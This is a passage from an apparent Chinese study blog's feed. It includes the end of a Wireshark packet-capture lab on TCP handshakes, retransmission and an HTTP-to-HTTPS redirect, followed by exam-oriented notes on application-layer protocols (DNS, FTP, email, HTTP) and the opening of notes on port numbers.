<p><strong>TCP三次握手：（之前的实验分析过TCP三次握手的数据包了）</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_118.png" class="" title="在这里插入图片描述">

<p><strong>TCP四次挥手：（之前的实验分析过TCP四次挥手的数据包了）</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_119.png" class="" title="在这里插入图片描述">
<blockquote>
<p>结合抓包数据与 TCP 状态图，u、v、w的取值是 “三次握手后数据传输驱动序列号递增” 及 “TCP 报文序列号规则” 共同作用的结果：u&#x3D;489对应客户端发起 FIN 报文（包 366）的序列号，v&#x3D;670对应服务器回复 ACK 报文（包 367）的序列号，二者的数值是三次握手后数据传输让初始序列号持续递增的结果；而w&#x3D;670则因 TCP 纯 ACK 报文不占用序列号，服务器发起 FIN 时延续了回复 ACK 的序列号，同时服务器回 ACK 的确认号（490）也符合状态图 “ACK&#x3D;u+1” 的规则。</p>
</blockquote>
<p><strong>TCP超时重传：tcp.analysis.retransmission</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_120.png" class="" title="在这里插入图片描述">
<p>都是在重传同一个包</p>
<p><strong>过滤：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_121.png" class="" title="在这里插入图片描述">
<p>第一：使用的是 ip.src &#x3D;&#x3D; 4.145.79.80 的过滤指令，那就说明了 服务器一直重传失败<br>第二：不继续重传，说明触发发tcp重传的终止机制</p>
<p>一、核心机制 1：超时重传（Timeout Retransmission）<br>这是最基础的重传方式，靠 “超时等待” 触发：<br>1.	触发条件：发送方发送一个 TCP 报文后，会启动一个 “超时计时器（RTO，Retransmission Timeout）”；如果计时器到期前，没收到接收方的 ACK 确认包，就会重传这个报文。<br>2.	超时时间（RTO）怎么定？<br>	- 初始 RTO 是系统默认值（比如 1 秒）；<br>	-	后续会根据 “往返时间（RTT，报文发出去到收到 ACK 的时间）” 动态调整（比如 RTT 变长，RTO 也会跟着调大），避免误判超时。<br>3.	指数退避规则：每次重传失败后，RTO 会翻倍增长（比如第一次 RTO&#x3D;1 秒，第二次 &#x3D; 2 秒，第三次 &#x3D; 4 秒…），避免短时间内重复发包导致网络拥塞。<br>4.	终止条件：重传次数达到系统设定的 “最大重传次数”（比如 Linux 默认 15 次）后，发送方会认为 “连接彻底不可用”，停止重传并断开 TCP 连接。<br>二、核心机制 2：快速重传（ Fast Retransmission）<br>这是更高效的重传方式，靠 “重复 ACK” 主动触发：<br>1.	触发条件：接收方收到 “乱序的 TCP 报文” 时（比如应该收 Seq&#x3D;2，但先收到了 Seq&#x3D;3），会重复发送 “对已收到报文的 ACK”（比如一直发 Ack&#x3D;2）；当发送方收到3 个相同的重复 ACK，就会判定 “中间的报文（比如 Seq&#x3D;2）丢失了”，直接重传这个丢失的报文。<br>2.	优势：不用等超时计时器到期，靠 “重复 ACK” 主动发现丢包，重传速度更快，能提升传输效率。</p>
<p><strong>分析具体重传数据包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_122.png" class="" title="在这里插入图片描述">

<p><strong>http重定向分析：</strong><br><strong>http请求包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_123.png" class="" title="在这里插入图片描述">

<p><strong>http响应包：</strong></p>
<img src="/2025/12/29/%E4%BB%BB%E5%8A%A1%E5%AF%BC%E5%90%91%E8%AE%A1%E7%BD%91%E5%AD%A6%E4%B9%A0/image_124.png" class="" title="在这里插入图片描述">
<p>Frame 269是 GitHub Pages 服务器的 “指令包”：它通过301状态码 +Location字段，强制将你原本访问的HTTP地址，重定向到更安全的HTTPS地址 —— 这是 GitHub Pages 的默认安全规则，也是当前网站普遍采用的 “HTTP→HTTPS 强制跳转” 实现方式</p>
<p><strong>实验总结：</strong></p>
<blockquote>
<ol>
<li>   WEB 页面请求是多协议协同的完整流程：DNS 解析（域名→IP）→TCP 连接（可靠传输基础）→HTTP 请求与响应（应用层数据交互）→重定向（协议 &#x2F; 地址切换），各层协议各司其职、无缝衔接，确保请求合法、数据可靠传输。</li>
<li>   关键技术与协议特性验证：GitHub Pages 采用 “CNAME 记录 + CDN + 泛播” 架构，通过多 IP 分发提升服务可用性；DNS 解析依赖事务 ID 与 UDP 端口保障通信精准性；TCP 三次握手是可靠连接的核心；HTTP 301 重定向是实现协议升级（HTTP→HTTPS）的标准方式，体现了应用层协议的灵活性与安全性设计。</li>
<li>   抓包分析的核心技巧：清除缓存与历史会话是获取纯净数据包的前提；通过协议过滤（如dns tcp http）可快速定位关键流程；聚焦核心字段（DNS 的事务 ID、TCP 的标志位、HTTP 的状态码与 Location 头）能高效拆解协议交互逻辑</li>
</ol>
</blockquote>
<hr>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>第 6 章 应用层</title>
    <url>/2025/12/05/%E5%BA%94%E7%94%A8%E5%B1%82/</url>
    <content><![CDATA[<h2 id="6-1-网络应用模型"><a href="#6-1-网络应用模型" class="headerlink" title="6.1   网络应用模型"></a>6.1   网络应用模型</h2><h3 id="6-1-1-客户-服务器模型"><a href="#6-1-1-客户-服务器模型" class="headerlink" title="6.1.1    客户&#x2F;服务器模型"></a>6.1.1    客户&#x2F;服务器模型</h3><ul>
<li>基本概念<ul>
<li>有一个总是打开的主机称为服务器</li>
<li>服务于许多来自其他称为客户机的主机请求</li>
</ul>
</li>
<li>工作流程<ul>
<li><ol>
<li>服务器处于接收请求的状态</li>
</ol>
</li>
<li><ol start="2">
<li>客户机发出服务请求，并等待接收结果</li>
</ol>
</li>
<li><ol start="3">
<li>服务器收到请求后</li>
</ol>
<ul>
<li>分析请求</li>
<li>进行必要的处理</li>
<li>得到结果并发送给客户机</li>
</ul>
</li>
</ul>
</li>
<li>服务器特点<ul>
<li>运行专门提供服务的程序</li>
<li>可以同时处理多个客户请求<ul>
<li>包括远程或本地客户</li>
</ul>
</li>
<li>不需要知道客户程序地址</li>
</ul>
</li>
<li>客户机特点<ul>
<li>必须知道服务器程序地址</li>
</ul>
</li>
<li>主要特征<ul>
<li>客户是服务请求方</li>
<li>服务器是服务提供方</li>
<li>举例<ul>
<li>Web应用程序<ul>
<li>Web服务器服务于浏览器请求</li>
<li>处理流程<ul>
<li>接收客户机请求</li>
<li>发送所请求对象响应</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>常见应用<ul>
<li>Web</li>
<li>文件传输协议(FTP)</li>
<li>远程登录</li>
<li>电子邮件</li>
</ul>
</li>
<li>主要特点<ul>
<li><ol>
<li>网络中各计算机地位不平等</li>
</ol>
<ul>
<li>服务器可管理客户机<ul>
<li>通过用户权限限制</li>
</ul>
</li>
<li>网络管理集中方便<ul>
<li>由少数服务器负责</li>
</ul>
</li>
</ul>
</li>
<li><ol start="2">
<li>客户机间不直接通信</li>
</ol>
<ul>
<li>举例<ul>
<li>Web应用中两个浏览器不直接通信</li>
</ul>
</li>
</ul>
</li>
<li><ol start="3">
<li>可扩展性不佳</li>
</ol>
<ul>
<li>限制因素<ul>
<li>服务器硬件限制</li>
<li>网络带宽限制</li>
</ul>
</li>
<li>结果<ul>
<li>服务器支持的客户机数量有限</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-1-2-P2P模型"><a href="#6-1-2-P2P模型" class="headerlink" title="6.1.2    P2P模型"></a>6.1.2    P2P模型</h3><ul>
<li>基本概念<ul>
<li>网络中的传输内容不再保存在中心服务器上</li>
<li>每个节点同时具有下载、上传功能</li>
<li>权利和义务大体对等</li>
</ul>
</li>
<li>特点<ul>
<li>无固定客户和服务器划分</li>
<li>任意对等方(Peer)直接相互通信</li>
<li>本质仍使用客户&#x2F;服务器模型<ul>
<li>节点既作为客户访问资源</li>
<li>又作为服务器提供资源</li>
</ul>
</li>
</ul>
</li>
<li>优点<ul>
<li>减轻服务器计算压力</li>
<li>消除对单个服务器的依赖</li>
<li>任务分配到各个节点</li>
<li>提高系统效率和资源利用率</li>
<li>客户机间可直接共享文档</li>
<li>可扩展性好</li>
<li>网络健壮性强</li>
</ul>
</li>
<li>缺点<ul>
<li>占用较多内存</li>
<li>影响整机速度</li>
<li>对硬盘损伤较大</li>
<li>占用大量网络流量(50%-90%)</li>
<li>导致网络拥塞</li>
<li>ISP通常反对P2P应用</li>
</ul>
</li>
</ul>
<h2 id="6-2-域名系统-DNS"><a href="#6-2-域名系统-DNS" class="headerlink" title="6.2  域名系统(DNS)"></a>6.2  域名系统(DNS)</h2><h3 id="6-2-1-层次域名空间"><a href="#6-2-1-层次域名空间" class="headerlink" title="6.2.1    层次域名空间"></a>6.2.1    层次域名空间</h3><ul>
<li><p>层次域名空间</p>
<ul>
<li>因特网采用层次树状结构的命名方法</li>
<li>每个连接设备都有唯一的域名(Domain Name)</li>
<li>域(Domain)是名字空间中的可管理划分<ul>
<li>可划分为子域</li>
<li>形成多级域名结构(顶级域、二级域、三级域等)</li>
</ul>
</li>
<li>域名组成<ul>
<li>由标号序列组成</li>
<li>标号之间用点(“.”)分隔</li>
<li>示例：<a href="http://www.cskaoyan.com/">www.cskaoyan.com</a><ul>
<li>com: 顶级域名</li>
<li>cskaoyan: 二级域名</li>
<li>www: 三级域名</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>标号规则</p>
<ul>
<li>英文不区分大小写</li>
<li>只能使用连字符(-)，不能使用其他标点符号</li>
<li>单个标号不超过63个字符</li>
<li>完整域名最长不超过255个字符</li>
<li>域名书写顺序<ul>
<li>最低级域名在最左边</li>
<li>顶级域名在最右边</li>
</ul>
</li>
</ul>
</li>
<li><p>顶级域名分类(TLD)</p>
<ul>
<li>国家(地区)顶级域名(nTLD)<ul>
<li>.cn: 中国</li>
<li>.us: 美国</li>
<li>.uk: 英国</li>
</ul>
</li>
<li>通用顶级域名(gTLD)<ul>
<li>.com: 公司</li>
<li>.net: 网络服务机构</li>
<li>.org: 非营利性组织</li>
<li>.edu: 教育机构</li>
<li>.gov: 政府部门</li>
</ul>
</li>
<li>基础结构域名<ul>
<li>arpa: 用于反向域名解析(IP→域名)</li>
</ul>
</li>
</ul>
</li>
<li><p>域名空间树状结构</p>
<ul>
<li>根<ul>
<li>顶级域名<ul>
<li>aero</li>
<li>com</li>
<li>net</li>
<li>org</li>
<li>edu</li>
<li>gov</li>
<li>cn</li>
<li>uk</li>
</ul>
</li>
<li>二级域名(示例)<ul>
<li>cskaoyan</li>
<li>cctv</li>
<li>google</li>
<li>bj</li>
<li>edu</li>
<li>com</li>
</ul>
</li>
<li>三级域名(示例)<ul>
<li>mail</li>
<li>www</li>
<li>hust</li>
<li>hit</li>
</ul>
</li>
<li>四级域名(示例)<ul>
<li>mail</li>
<li>www</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>域名管理</p>
<ul>
<li>顶级域名由ICANN管理</li>
<li>国家顶级域名下的二级域名由各国自行管理</li>
<li>子域可委托给其他组织管理</li>
</ul>
</li>
</ul>
<h3 id="6-2-2-域名服务器"><a href="#6-2-2-域名服务器" class="headerlink" title="6.2.2   域名服务器"></a>6.2.2   域名服务器</h3><ul>
<li>定义<ul>
<li>域名到IP地址的解析由运行在域名服务器上的程序完成</li>
<li>管辖范围称为区（小于或等于域）</li>
<li>每个区设置权限域名服务器保存域名到IP地址的映射</li>
<li>域名服务器功能<ul>
<li>进行域名到IP地址的解析</li>
<li>具有连向其他域名服务器的信息</li>
</ul>
</li>
</ul>
</li>
<li>DNS服务器层次结构<ul>
<li>按层次方式组织</li>
<li>映射分布在所有域名服务器上</li>
<li>四种类型<ul>
<li>根域名服务器<ul>
<li>最高层次</li>
<li>知道所有顶级域名服务器的域名和IP地址</li>
<li>13个根域名服务器（实际是冗余服务器集群）</li>
<li>功能<ul>
<li>管辖顶级域（如.com）</li>
<li>通常不直接转换域名，而是指引查询方向</li>
</ul>
</li>
</ul>
</li>
<li>顶级域名服务器<ul>
<li>管理在该顶级域名服务器注册的所有二级域名</li>
<li>响应DNS查询请求<ul>
<li>可能给出最终结果</li>
<li>可能指引下一步查询</li>
</ul>
</li>
</ul>
</li>
<li>权限域名服务器（授权域名服务器）<ul>
<li>每台主机必须在此登记</li>
<li>建议至少两台以提高可靠性</li>
<li>功能<ul>
<li>总能将其管辖的主机名转换为IP地址</li>
</ul>
</li>
</ul>
</li>
<li>本地域名服务器<ul>
<li>重要性<ul>
<li>对域名系统非常重要</li>
</ul>
</li>
<li>部署<ul>
<li>ISP、大学或院系可拥有</li>
</ul>
</li>
<li>功能<ul>
<li>接收主机的DNS查询请求</li>
<li>在Windows系统中配置为</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-2-3-域名解析过程"><a href="#6-2-3-域名解析过程" class="headerlink" title="6.2.3   域名解析过程"></a>6.2.3   域名解析过程</h3><ul>
<li>DNS协议的作用(2021)</li>
<li>域名解析定义<ul>
<li>将域名转化为IP地址的过程</li>
<li>客户端通过DNS客户端构造DNS请求报文，以UDP数据报方式发往本地域名服务器</li>
</ul>
</li>
<li>域名解析方式<ul>
<li>递归查询<ul>
<li>主机向本地域名服务器的查询方式</li>
<li>本地域名服务器不知道被查询域名的IP地址时，以DNS客户身份向根域名服务器继续查询</li>
</ul>
</li>
<li>迭代查询<ul>
<li>本地域名服务器向其他域名服务器的查询方式</li>
<li>DNS的工作原理(2016、2020)</li>
<li>服务器要么给出IP地址，要么告知下一步应查询的顶级域名服务器</li>
</ul>
</li>
</ul>
</li>
<li>域名解析过程示例(y.abc.com)<ul>
<li>最多使用8个UDP报文(4查询+4回答)</li>
<li>步骤:<br>①. 客户机向本地域名服务器发出DNS请求报文(递归查询)<br>②. 本地域名服务器查询本地缓存，若无记录则向根域名服务器发出解析请求(迭代查询)<br>③. 根域名服务器判断域名属于.com域，返回顶级域名服务器dns.com的IP地址<br>④. 本地域名服务器向dns.com发出解析请求(迭代查询)<br>⑤. dns.com判断域名属于abc.com域，返回权限域名服务器dns.abc.com的IP地址<br>⑥. 本地域名服务器向dns.abc.com发起解析请求(迭代查询)<br>⑦. dns.abc.com返回查询结果<br>⑧. 本地域名服务器保存结果到缓存并返回给客户机</li>
</ul>
</li>
<li>DNS查询优化<ul>
<li>使用高速缓存<ul>
<li>缓存最近查询过的域名映射信息</li>
<li>相同查询到达时可直接提供IP地址</li>
<li>缓存信息会在一段时间后丢弃(映射非永久)</li>
</ul>
</li>
<li>主机端优化<ul>
<li>启动时从本地域名服务器下载全部数据库</li>
<li>维护最近使用的域名高速缓存</li>
<li>缓存中找不到时才使用域名服务器</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="6-3-文件传输协议-FTP"><a href="#6-3-文件传输协议-FTP" class="headerlink" title="6.3   文件传输协议(FTP)"></a>6.3   文件传输协议(FTP)</h2><h3 id="6-3-1-FTP-的工作原理"><a href="#6-3-1-FTP-的工作原理" class="headerlink" title="6.3.1    FTP 的工作原理"></a>6.3.1    FTP 的工作原理</h3><ul>
<li>定义<ul>
<li>文件传输协议(File Transfer Protocol,FTP)</li>
<li>因特网上使用最广泛的文件传输协议</li>
<li>提供交互式访问</li>
<li>允许指定文件类型与格式</li>
<li>允许设置存取权限</li>
<li>屏蔽计算机系统细节</li>
<li>适合异构网络间文件传输</li>
</ul>
</li>
<li>功能<ul>
<li>①. 提供不同种类主机系统间的文件传输能力</li>
<li>②. 以用户权限管理方式提供远程文件管理能力</li>
<li>③. 以匿名FTP方式提供公用文件共享能力</li>
</ul>
</li>
<li>工作方式<ul>
<li>采用客户&#x2F;服务器模式</li>
<li>使用TCP可靠传输服务</li>
<li>一个服务器进程可服务多个客户进程</li>
</ul>
</li>
<li>服务器组成<ul>
<li>主进程<ul>
<li>负责接收新请求</li>
</ul>
</li>
<li>从属进程<ul>
<li>负责处理单个请求</li>
</ul>
</li>
</ul>
</li>
<li>工作步骤<ul>
<li>①. 打开熟知端口21(控制端口)</li>
<li>②. 等待客户进程连接请求</li>
<li>③. 启动从属进程处理请求</li>
<li>④. 从属进程处理完毕后终止</li>
<li>⑤. 主进程继续等待其他请求</li>
<li>主进程与从属进程并发执行</li>
</ul>
</li>
<li>会话特性<ul>
<li>服务器必须保留用户状态信息</li>
<li>必须关联用户账户与控制连接</li>
<li>必须追踪用户远程目录当前位置</li>
</ul>
</li>
</ul>
<h3 id="6-3-2-控制连接与数据连接"><a href="#6-3-2-控制连接与数据连接" class="headerlink" title="6.3.2   控制连接与数据连接"></a>6.3.2   控制连接与数据连接</h3><ul>
<li>FTP使用两个并行的TCP连接<ul>
<li>控制连接(服务器端口号21)</li>
<li>数据连接(服务器端口号20)</li>
</ul>
</li>
<li>①. 控制连接<ul>
<li>服务器监听21号端口</li>
<li>传输控制信息<ul>
<li>连接请求</li>
<li>传送请求等</li>
</ul>
</li>
<li>不用于传送文件</li>
<li>在整个会话期间保持打开状态</li>
</ul>
</li>
<li>②. 数据连接<ul>
<li>服务器创建</li>
<li>用于实际数据传输</li>
<li>按需创建和关闭</li>
<li>传输文件内容</li>
<li>每次数据传输建立新的连接</li>
</ul>
</li>
</ul>
<h2 id="6-4-电子邮件"><a href="#6-4-电子邮件" class="headerlink" title="6.4   电子邮件"></a>6.4   电子邮件</h2><h3 id="6-4-1-电子邮件系统的组成结构"><a href="#6-4-1-电子邮件系统的组成结构" class="headerlink" title="6.4.1    电子邮件系统的组成结构"></a>6.4.1    电子邮件系统的组成结构</h3><ul>
<li>电子邮件特点<ul>
<li>异步通信方式</li>
<li>通信时不需要双方同时在场</li>
<li>邮件存放在收件人邮箱中，可随时读取</li>
</ul>
</li>
<li>主要组成构件<ul>
<li>用户代理(User Agent)<ul>
<li>定义：用户与电子邮件系统的接口</li>
<li>功能<ul>
<li>撰写</li>
<li>显示</li>
<li>邮件处理</li>
</ul>
</li>
<li>常见实例<ul>
<li>Outlook</li>
<li>Foxmail</li>
</ul>
</li>
</ul>
</li>
<li>邮件服务器<ul>
<li>功能<ul>
<li>发送和接收邮件</li>
<li>报告邮件传送状态</li>
</ul>
</li>
<li>工作模式：客户&#x2F;服务器模式</li>
<li>特点：可同时充当客户和服务器</li>
</ul>
</li>
<li>电子邮件协议<ul>
<li>邮件发送协议<ul>
<li>用途<ul>
<li>用户代理→邮件服务器</li>
<li>邮件服务器之间</li>
</ul>
</li>
<li>实例：SMTP<ul>
<li>通信方式：推(Push)</li>
</ul>
</li>
</ul>
</li>
<li>邮件读取协议<ul>
<li>用途：用户代理从邮件服务器读取邮件</li>
<li>实例：POP3<ul>
<li>通信方式：拉(Pull)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>电子邮件收发过程<br>①. 发件人撰写邮件<br>②. 用户代理通过SMTP发送邮件到发送端邮件服务器<br>③. 发送端邮件服务器将邮件放入缓存队列<br>④. SMTP客户与接收端SMTP服务器建立TCP连接并发送邮件<br>⑤. 接收端SMTP服务器将邮件放入收件人邮箱<br>⑥. 收件人通过POP3&#x2F;IMAP协议取回邮件</li>
</ul>
<h3 id="6-4-2-电子邮件格式与MIME"><a href="#6-4-2-电子邮件格式与MIME" class="headerlink" title="6.4.2    电子邮件格式与MIME"></a>6.4.2    电子邮件格式与MIME</h3><ul>
<li>①. 电子邮件格式<ul>
<li>电子邮件分为信封和内容两大部分<ul>
<li>邮件内容分为首部和主体两部分<ul>
<li>RFC 822规定了邮件的首部格式</li>
<li>主体部分由用户自由撰写</li>
</ul>
</li>
</ul>
</li>
<li>邮件内容的首部包含首部行<ul>
<li>每个首部行由关键字后跟冒号和值组成<ul>
<li>必需关键字：To<ul>
<li>填入一个或多个收件人的电子邮件地址<ul>
<li>格式：收件人邮箱名@邮箱所在主机的域名<ul>
<li>如：<a href="mailto:&#97;&#x62;&#99;&#64;&#99;&#x73;&#107;&#97;&#111;&#x79;&#x61;&#x6e;&#46;&#99;&#111;&#109;">abc@cskaoyan.com</a></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>可选关键字：Subject<ul>
<li>邮件的主题</li>
</ul>
</li>
<li>必填关键字：From<ul>
<li>通常由邮件系统自动填入</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>首部与主体之间用一个空行分割</li>
</ul>
</li>
<li>②. 多用途因特网邮件扩展 (MIME)<ul>
<li>SMTP只能传送7位ASCII码文本邮件<ul>
<li>无法传送非英语国家文字</li>
<li>无法传送可执行文件及其他二进制对象</li>
</ul>
</li>
<li>MIME的作用<ul>
<li>未改动或取代SMTP</li>
<li>发送端：将非ASCII码数据转换为ASCII码数据</li>
<li>接收端：将ASCII码数据逆转换为非ASCII码数据</li>
</ul>
</li>
<li>MIME主要包括三部分内容<ul>
<li>5个新的邮件首部字段<ul>
<li>MIME版本</li>
<li>内容描述</li>
<li>内容标识</li>
<li>传送编码</li>
<li>内容类型</li>
</ul>
</li>
<li>定义了许多邮件内容的格式<ul>
<li>对多媒体电子邮件的表示方法进行标准化</li>
</ul>
</li>
<li>定义了传送编码<ul>
<li>可对任何内容格式进行转换</li>
<li>不会被邮件系统改变</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="6-4-3-SMTP-和-POP3"><a href="#6-4-3-SMTP-和-POP3" class="headerlink" title="6.4.3    SMTP 和 POP3"></a>6.4.3    SMTP 和 POP3</h3><ul>
<li>1.SMTP<ul>
<li>简单邮件传输协议 (Simple Mail Transfer Protocol,SMTP)<ul>
<li>提供可靠且有效的电子邮件传输的协议</li>
<li>控制两个相互通信的SMTP进程交换信息</li>
<li>采用客户&#x2F;服务器模式<ul>
<li>发送邮件的SMTP进程是SMTP客户</li>
<li>接收邮件的SMTP进程是SMTP服务器</li>
</ul>
</li>
<li>使用TCP连接，端口号为25</li>
</ul>
</li>
<li>SMTP 通信的三个阶段<ul>
<li>(1)连接建立<ul>
<li>SMTP客户与接收方SMTP服务器建立TCP连接</li>
<li>SMTP服务器发出220 Service ready</li>
<li>SMTP客户发送HELO命令，附上发送方的主机名</li>
<li>TCP连接在发送方和接收方邮件服务器之间直接建立</li>
</ul>
</li>
<li>(2)邮件传送<ul>
<li>从MAIL命令开始，后面有发件人的地址</li>
<li>一个或多个RCPT命令，格式为RCPT TO:&lt;收件人地址&gt;</li>
<li>客户端使用DATA命令开始传送邮件内容</li>
<li>用<CRLF>.<CRLF>表示邮件内容的结束</li>
</ul>
</li>
<li>(3)连接释放<ul>
<li>SMTP客户发送QUIT命令</li>
<li>SMTP服务器返回221(服务关闭)</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>2.POP3 和 IMAP<ul>
<li>邮局协议 (Post Office Protocol,POP)<ul>
<li>版本：POP3</li>
<li>采用客户&#x2F;服务器模式</li>
<li>传输层使用TCP，端口号为110</li>
<li>两种工作方式<ul>
<li>下载并保留</li>
<li>下载并删除</li>
</ul>
</li>
</ul>
</li>
<li>因特网报文存取协议(IMAP)<ul>
<li>比POP复杂</li>
<li>提供创建文件夹、移动邮件、查询邮件等联机命令</li>
<li>IMAP服务器维护会话用户的状态信息</li>
<li>允许用户代理只获取报文的某些部分</li>
</ul>
</li>
<li>基于万维网的电子邮件<ul>
<li>用户浏览器与邮件服务器之间使用HTTP</li>
<li>不同邮件服务器之间传送邮件时使用SMTP</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="6-5-万维网-WwW"><a href="#6-5-万维网-WwW" class="headerlink" title="6.5   万维网(WwW)"></a>6.5   万维网(WwW)</h2><h3 id="6-5-1-WwW-的概念与组成结构"><a href="#6-5-1-WwW-的概念与组成结构" class="headerlink" title="6.5.1    WwW  的概念与组成结构"></a>6.5.1    WwW  的概念与组成结构</h3><ul>
<li>万维网(WWW)定义<ul>
<li>分布式、联机式的信息存储空间</li>
<li>资源由URL标识</li>
<li>通过HTTP协议传输</li>
<li>使用超链接实现站点间访问</li>
</ul>
</li>
<li>三个核心标准<ul>
<li>统一资源定位符(URL)<ul>
<li>功能：标识万维网文档</li>
<li>格式：&lt;协议&gt;:&#x2F;&#x2F;&lt;主机&gt;:&lt;端口&gt;&#x2F;&lt;路径&gt;</li>
<li>特点：不区分大小写</li>
</ul>
</li>
<li>超文本传输协议(HTTP)<ul>
<li>应用层协议</li>
<li>使用TCP连接</li>
</ul>
</li>
<li>超文本标记语言(HTML)<ul>
<li>文档结构标记语言</li>
<li>描述页面信息和格式</li>
</ul>
</li>
</ul>
</li>
<li>工作模式<ul>
<li>客户&#x2F;服务器模式<ul>
<li>浏览器：客户程序</li>
<li>Web服务器：服务器程序</li>
</ul>
</li>
<li>工作流程<br>①. 浏览器(指定URL)与服务器建立连接<br>②. 服务器将URL转换为文件路径并返回信息<br>③. 通信完成关闭连接</li>
</ul>
</li>
<li>万维网与因特网关系<ul>
<li>构成因特网最主要部分</li>
<li>还包括：电子邮件、Usenet、新闻组</li>
</ul>
</li>
</ul>
<h3 id="6-5-2-超文本传输协议-HTTP"><a href="#6-5-2-超文本传输协议-HTTP" class="headerlink" title="6.5.2    超文本传输协议(HTTP)"></a>6.5.2    超文本传输协议(HTTP)</h3><ul>
<li>定义<ul>
<li>浏览器与服务器请求和传送文档的协议</li>
<li>面向事务的应用层协议</li>
</ul>
</li>
<li>HTTP操作过程<ul>
<li>域名解析</li>
<li>TCP连接建立（端口80）</li>
<li>HTTP请求</li>
<li>HTTP响应</li>
<li>TCP连接释放</li>
<li>用户点击事件顺序示例<ul>
<li>URL分析</li>
<li>DNS解析</li>
<li>TCP连接</li>
<li>HTTP请求</li>
<li>HTTP响应</li>
<li>TCP释放</li>
<li>页面显示</li>
</ul>
</li>
</ul>
</li>
<li>HTTP特点<ul>
<li>使用TCP保证可靠传输</li>
<li>无连接</li>
<li>无状态</li>
<li>Cookie机制<ul>
<li>识别码生成</li>
<li>Set-cookie首部</li>
<li>Cookie首部</li>
</ul>
</li>
<li>连接方式<ul>
<li>非持续连接（HTTP&#x2F;1.0）<ul>
<li>每个对象单独TCP连接</li>
<li>2×RTT开销</li>
</ul>
</li>
<li>持续连接（HTTP&#x2F;1.1）<ul>
<li>非流水线</li>
<li>流水线</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>HTTP报文结构<ul>
<li>请求报文<ul>
<li>请求行（方法、URL、版本）</li>
<li>首部行</li>
<li>实体主体</li>
</ul>
</li>
<li>响应报文<ul>
<li>状态行（版本、状态码、短语）</li>
<li>首部行</li>
<li>实体主体</li>
</ul>
</li>
<li>常用方法<ul>
<li>GET</li>
<li>HEAD</li>
<li>POST</li>
<li>PUT</li>
<li>DELETE</li>
</ul>
</li>
</ul>
</li>
<li>HTTP请求报文示例<ul>
<li>以太网帧结构</li>
<li>IP首部</li>
<li>TCP首部</li>
<li>HTTP请求内容解析</li>
</ul>
</li>
</ul>
]]></content>
      <categories>
        <category>408</category>
        <category>计算机网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>应用层</tag>
      </tags>
  </entry>
  <entry>
    <title>端口协议</title>
    <url>/2025/12/13/%E7%AB%AF%E5%8F%A3%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h2 id="一、端口基础概念"><a href="#一、端口基础概念" class="headerlink" title="一、端口基础概念"></a>一、端口基础概念</h2><h3 id="1-端口的作用"><a href="#1-端口的作用" class="headerlink" title="1. 端口的作用"></a>1. 端口的作用</h3><ul>
<li>一台拥有IP地址的主机可以提供多种网络服务（如Web、FTP、SMTP等）</li>
<li>通过”IP地址+端口号”的组合来区分不同的网络服务</li>
<li>解决了IP地址与网络服务之间”一对多”的关系问题</li>
</ul>
<h3 id="2-端口类型"><a href="#2-端口类型" class="headerlink" title="2. 端口类型"></a>2. 端口类型</h3><table>
<thead>
<tr>
<th>类型</th>
<th>描述</th>
<th>特点</th>
<th>常见端口示例</th>
</tr>
</thead>
<tbody><tr>
<td><strong>TCP端口</strong></td>
<td>传输控制协议端口</td>
<td>需要在客户端和服务器之间建立连接，提供可靠的数据传输</td>
<td>21(FTP)、23(Telnet)、25(SMTP)、80(HTTP)</td>
</tr>
<tr>
<td><strong>UDP端口</strong></td>
<td>用户数据包协议端口</td>
<td>无需建立连接，传输速度快但安全性低</td>
<td>53(DNS)、161(SNMP)、8000(QQ)</td>
</tr>
</tbody></table>
<blockquote>
<p><strong>重要提示</strong>：TCP和UDP端口号相互独立，例如TCP 235端口与UDP 235端口不冲突</p>
</blockquote>
<h3 id="3-端口范围划分"><a href="#3-端口范围划分" class="headerlink" title="3. 端口范围划分"></a>3. 端口范围划分</h3><table>
<thead>
<tr>
<th>范围</th>
<th>类型</th>
<th>描述</th>
<th>用途</th>
</tr>
</thead>
<tbody><tr>
<td>0-1023</td>
<td>预留端口</td>
<td>由操作系统保留，仅超级用户特权应用可使用</td>
<td>系统关键服务</td>
</tr>
<tr>
<td>1024-49151</td>
<td>登记端口</td>
<td>一般服务器程序使用的端口范围</td>
<td>自定义服务端口</td>
</tr>
<tr>
<td>49152-65535</td>
<td>临时端口</td>
<td>客户端进程动态选择的端口</td>
<td>临时通信使用</td>
</tr>
</tbody></table>
